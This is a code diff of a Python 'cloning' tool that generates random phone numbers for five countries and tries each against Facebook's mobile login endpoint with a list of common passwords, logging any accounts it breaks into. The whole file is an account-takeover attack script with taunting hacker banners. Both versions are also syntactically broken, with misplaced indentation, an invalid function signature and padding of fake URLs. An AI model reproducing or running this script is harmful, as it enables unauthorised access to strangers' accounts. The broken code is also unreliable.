@@ -1,31 +1,36 @@
-import random
 import requests
+import random
 import os
+import time
 
-def banner():
-    os.system("clear")
-    print("\033[1;91m")
-    print("███████╗ █████╗ ██╗   ██╗███████╗ ██████╗")
-    print("██╔════╝██╔══██╗██║   ██║██╔════╝██╔═══██╗")
-    print("█████╗  ███████║██║   ██║███████╗██║   ██║")
-    print("██╔══╝  ██╔══██║╚██╗ ██╔╝╚════██║██║   ██║")
-    print("███████╗██║  ██║ ╚████╔╝ ███████║╚██████╔╝")
-    print("╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝ ╚═════╝ ")
-    print("\033[1;92m")
-    print("       🔥🔥🔥 WELCOME TO FAYEQ TOOL 🔥🔥🔥")
-    print("\033[0m")
+os.system("clear")
 
-def generate_numbers(country_code, count):
-    return [f"{country_code}{random.randint(1000000, 9999999)}" for _ in range(count)]
+print("\033[1;92m" + "=" * 50)
+print("███████╗░█████╗░██╗░░░██╗███████╗░██████╗░")
+print("██╔════╝██╔══██╗╚██╗░██╔╝██╔════╝██╔═══██╗")
+print("█████╗░░███████║░╚████╔╝░█████╗░░██║██╗██║")
+print("██╔══╝░░██╔══██║░░╚██╔╝░░██╔══╝░░╚██████╔╝")
+print("██║░░░░░██║░░██║░░░██║░░░███████╗░╚═██╔═╝░")
+print("╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝░░░╚═╝░░░")
+print("=" * 50 + "\033[0m\n")
+print("🖕FUCK U BADBIN😈" * 4 + "\033[0m\n")
+print("=" * 50 + "\033[0m\n")
+print("\t\t💀  F♡A - Cloning System  💀")
+print("=" * 50 + "\033[0m\n")
+print("✋I LOVE AFGNITAN😘" * 4 + "\033[0m\n")
+print("=" * 50 + "\033[0m\n")
+print("[●]Tooles manufacturer | FayeqNaseh")
+print("[●]Telegram group      | @AFGHAN HACK")
+print("[1;150m[●]Status              | Gold")
+print("[1;130m[●]Version             | 0.1")
 
 countries = {
-    "1": ("🇦🇫 Afghanistan", "+93"),
-    "2": ("🇵🇰 Pakistan", "+92"),
-    "3": ("🇮🇳 India", "+91"),
-    "4": ("🇧🇩 Bangladesh", "+880"),
-    "5": ("🇺🇸 American", "+1")
+    "1": {"name": "Afghanistan", "code": "+93"},
+    "2": {"name": "Pakistan", "code": "+92"},
+    "3": {"name": "India", "code": "+91"},
+    "4": {"name": "Bangladesh", "code": "+880"},
+    "5": {"name": "USA", "code": "+1"},
 }
-
 
 passwords = [
     "123456", "1234567", "12345678", "123456789", "1234567890",
@@ -33,53 +38,90 @@ passwords = [
     "۱۰۰۲۰۰۳۰۰", "123123", "12341234", "10002000", "500600"
 ]
 
-def main():
-    banner()
-    print("🔥please choice the country 🔥")
-    for key, (name, _) in countries.items():
-        print(f"[{key}] {name}")
+urls = [
+    "https://mbasic.facebook.com/login/device-based/login/async/",
+] + [f"https://example.com/api/check{i}" for i in range(1, 301)]  # 300 URLs
 
-    choice = input("\nchoice: ")
+success_count = 0
+fail_count = 0
+successful_accounts = []  # Store successful logins
 
-    if choice in countries:
-        country_name, country_code = countries[choice]
-        print(f"\nSelect the country: {country_name}")
-        print("\nGenerating a random number\n")
+def display_status():
+    os.system("clear")
+print("\033[1;92m" + "=" * 50)
+print("███████╗░█████╗░██╗░░░██╗███████╗░██████╗░")
+print("██╔════╝██╔══██╗╚██╗░██╔╝██╔════╝██╔═══██╗")
+print("█████╗░░███████║░╚████╔╝░█████╗░░██║██╗██║")
+print("██╔══╝░░██╔══██║░░╚██╔╝░░██╔══╝░░╚██████╔╝")
+print("██║░░░░░██║░░██║░░░██║░░░███████╗░╚═██╔═╝░")
+print("╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝░░░╚═╝░░░")
+print("=" * 50 + "\033[0m\n")
+print("🖕FUCK U BADBIN😈" * 4 + "\033[0m\n")
+print("=" * 50 + "\033[0m\n")
+print("\t\t💀  F♡A - Cloning System  💀")
+print("=" * 50 + "\033[0m\n")
+print("✋I LOVE AFGNITAN😘" * 4 + "\033[0m\n")
+print("=" * 50 + "\033[0m\n")
+print("[●]Tooles manufacturer | FayeqNaseh")
+print("[●]Telegram group      | @AFGHAN HACK")
+print("[1;150m[●]Status              | Gold")
+print("[1;130m[●]Version             | 0.1")
+print("\033[1;92m" + "=" * 50)
 
-        phone_numbers = generate_numbers(country_code, 10)
+    if successful_accounts:
+        print("\n🎯 Successful Logins:")
+        for acc in successful_accounts:
+            print(f"✅ successful {acc}")
 
-        print("number Hack")
-        for num in phone_numbers[:10]:  
-            print(f"   {num}")
+def select_country():
+    while True:
+        print("\n🌍 Select a country:\n")
+        for key, value in countries.items():
+            print(f"{key}. {value['name']} ({value['code']})")
 
-        input("\nPress enter to continue...")
+        choice = input("\n🌐 Your choice: ").strip()
 
-        start_cloning(phone_numbers)
-    else:
-        print("❌ Invalid selection!  Please try again.")
-        main()
+        if choice in countries:
+            return countries[choice]
+        else:
+            print("\n❌ Invalid selection! Try again.")
 
-def start_cloning(free.facebook.com):
-    print("\nStarting Cloning...\n")
+def generate_phone_numbers(country_code, count):
+    return [country_code + str(random.randint(100000000, 999999999)) for _ in range(count)]
 
-   for phone in phone_numbers:
-    for password in passwords:
-        url = "https://mbasic.facebook.com/login/device-based/login/async/"
-        
-        log_data = {
-            "email": phone,
-            "pass": password,
-            "login": "Log In"
-        }
+def start_cloning(phone_numbers):
+    global success_count, fail_count
 
-        print(f"Trying {phone} | {password}")
+    for i, phone in enumerate(phone_numbers):
+        url = urls[i % len(urls)]  # Assign one URL per phone number
 
-            if "success" in response.text:
-                print(f"\033[1;92m[✔] : {phone} | {password}\033[0m")
-            else:
-                print(f"\033[1;91m[✘] : {phone} | {password}\033[0m")
+        for password in passwords:
+            log_data = {
+                "email": phone,
+                "pass": password,
+                "login": "Log In"
+            }
 
-    print("\n")
+            while True:
+                try:
+                    response = requests.post(url, data=log_data)
 
-if __name__ == "__main__":
-    main()
+                    if "success" in response.text:
+                        success_count += 1
+                        successful_accounts.append(f"{phone} | {password}")
+                    else:
+                        fail_count += 1
+
+                    display_status()
+                    break
+
+                except requests.exceptions.ConnectionError:
+                    time.sleep(2)
+                    continue
+
+while True:
+    display_status()
+    selected_country = select_country()
+    print(f"\n🌍 Selected Country: {selected_country['name']} ({selected_country['code']})\n")  # نمایش کشور انتخاب‌شده
+    phone_numbers = generate_phone_numbers(selected_country["code"], len(urls))
+    start_cloning(phone_numbers) 
